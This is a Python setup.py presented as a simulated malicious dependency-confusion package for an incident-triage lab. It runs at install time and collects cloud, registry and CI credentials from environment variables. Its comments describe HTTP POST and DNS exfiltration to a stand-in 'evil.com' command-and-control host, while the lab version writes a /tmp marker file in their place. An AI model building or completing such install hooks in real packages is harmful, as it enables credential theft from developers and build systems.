"""
SIMULATED malicious setup.py for training purposes.
This file represents what an attacker's dependency confusion package would contain.
DO NOT use this code outside of this lab -- it is a reference artifact for incident triage.
"""

from setuptools import setup
import os
import json
import base64

# --- MALICIOUS PAYLOAD (simulated) ---

def exfiltrate():
    """Simulates credential theft during pip install."""
    sensitive_vars = {}
    target_vars = [
        "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
        "NPM_TOKEN", "PYPI_TOKEN",
        "DOCKER_PASSWORD", "DOCKER_USERNAME",
        "GITHUB_TOKEN", "GITLAB_TOKEN",
        "FIREBASE_TOKEN", "WANDB_API_KEY",
        "SONAR_TOKEN", "SENTRY_DSN",
        "CLOUDFLARE_API_KEY",
    ]
    for var in target_vars:
        val = os.environ.get(var)
        if val:
            sensitive_vars[var] = val

    sensitive_vars["hostname"] = os.uname().nodename
    sensitive_vars["user"] = os.environ.get("USER", "unknown")
    sensitive_vars["cwd"] = os.getcwd()

    # REAL ATTACK TECHNIQUE 1: HTTP POST exfiltration
    # Uses requests or urllib to POST stolen env vars to attacker C2:
    #   urllib.request.urlopen(req)  with data=json.dumps(sensitive_vars)
    #   Target: https://attacker-c2.evil.com/exfil

    # REAL ATTACK TECHNIQUE 2: DNS exfiltration as fallback
    # Base64-encodes stolen data and sends it as DNS subdomain queries:
    #   subprocess.run(["nslookup", f"{encoded[:63]}.data.attacker-c2.evil.com"])

    # FOR THIS LAB: write to a marker file instead of actual exfiltration
    marker = "/tmp/supply-chain-incident-marker"
    with open(marker, "w") as f:
        json.dump({
            "compromised": True,
            "package": "internal-utils",
            "version": "99.0.0",
            "exfiltrated_vars": list(sensitive_vars.keys()),
            "timestamp": "2026-04-04T14:02:18Z"
        }, f, indent=2)

# Execute during install -- this runs BEFORE the package is importable
exfiltrate()

# --- END MALICIOUS PAYLOAD ---

setup(
    name="internal-utils",
    version="99.0.0",
    description="Internal utilities (MALICIOUS - published to public PyPI by attacker)",
    py_modules=["internal_utils"],
)
